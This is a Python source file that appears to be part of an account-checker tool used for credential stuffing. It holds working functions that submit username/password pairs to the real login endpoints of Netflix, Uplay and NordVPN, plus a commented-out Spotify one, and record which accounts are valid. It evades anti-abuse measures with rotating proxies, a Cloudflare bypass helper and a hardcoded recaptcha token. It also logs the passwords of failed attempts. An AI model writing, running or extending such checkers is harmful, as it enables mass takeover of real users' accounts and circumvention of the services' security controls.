from manage_requests import ManageRequests
from bs4 import BeautifulSoup
import base64
import logging as log

# def spotify(self, creds):
#     site_get = "https://accounts.spotify.com/it/login"
#     cookies = self.req.get(site_get).cookies.get_dict()
#     csrf = cookies["csrf_token"]
#     cookies["__bon"] = "MHwwfC00ODY2MjU5N3wtMjA0MzgyOTA3NHwxfDF8MXwx"  # Non me gusta hardcodarlo
#     site_post=site_get
#     site_post = "https://accounts.spotify.com/password/login/"
#     usr = creds.split(":")[0].strip()
#     pwd = creds.split(":")[1].strip()
#     self.req.headers.update({"content-length": str(9999)})
#     account_proxy = self.set_random_proxyy()
#     recaptcha="3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
#     res = self.post_with_checks(site_post,
#                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
#                                 cookies=cookies)
#     print(res.content)

def netflix(usr, pwd, mr):
    mr : ManageRequests
    site_url = "https://www.netflix.com/Login"

    # Get login page with authURL
    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
    # Filter out authURL value
    soup = BeautifulSoup(res.text, features="html.parser")
    authURL = soup.find('input', attrs={'name': 'authURL'})['value']

    # Post request to login
    res = mr.post_with_checks(site_url,
                              data={'email': usr,
                                    'password': pwd,
                                    'rememberMe': True,
                                    'flow': 'websiteSignUp',
                                    'mode': 'login',
                                    'action': 'loginAction',
                                    'withFields': 'email,password,rememberMe,nextPage',
                                    'authURL': authURL,
                                    'nextPage': 'https://www.netflix.com/viewingactivity'
                                    })

    if 'Login' not in res.url:
        mr.db.update_result(usr, pwd, "netflix", "True")
        log.info("Account valid {}".format(usr))
    else:
        mr.db.update_result(usr, pwd, "netflix", "False")
        log.info("Account error {} {}".format(usr, pwd))
    log.info("-------------------------------")
    mr.req.cookies.clear()
    
    
def uplay(usr, pwd, mr):
    mr: ManageRequests
    usr: str
    pwd: str
    site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
    creds = str.encode(usr + ":" + pwd)
    encoding = base64.b64encode(creds).decode()
    mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
                      "Authorization": "Basic " + encoding}
    res = mr.post_with_checks(site_post)
    
    if res:
        if res.status_code == 200:
            mr.db.update_result(usr, pwd, "uplay", "True")
            log.info("Account valid {}".format(usr))
        else:
            mr.db.update_result(usr, pwd, "uplay", "False")
            log.info("Account error {} {}".format(usr, pwd))
    else:
        mr.db.update_result(usr, pwd, "uplay", "False")
        log.info("Account error {} {}".format(usr, pwd))
    
    log.info("-------------------------------")
    mr.req.cookies.clear()
    
    
def nordvpn(usr, pwd, mr):
    """
    Custom functions must have 3 params: username and password to check, and a ManageRequests object
    The MR object has all the primitives that you need.
    Remember to update the database via mr.db
    """

    sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
    siteGet = "https://ucp.nordvpn.com/login"
    # Retrieve CF valid cookie

    cookies = mr.bypass_cf(siteGet)
    # change proxy account
    res = mr.post_with_checks(sitePost,
                              data={"username": usr, "password": pwd}, cookies=cookies)
    res = dict(res.cookies).get("token", None)

    # check if inside the cookie the token is set, if positive the account is valid
    if res:
        mr.db.update_result(usr, pwd, "nordvpn", "True")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "True")
        log.info("Account valid {}".format(usr))
    else:
        mr.db.update_result(usr, pwd, "nordvpn", "False")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "False")
        log.info("Account error {} {}".format(usr, pwd))
    log.info("-------------------------------")
    mr.req.cookies.clear()
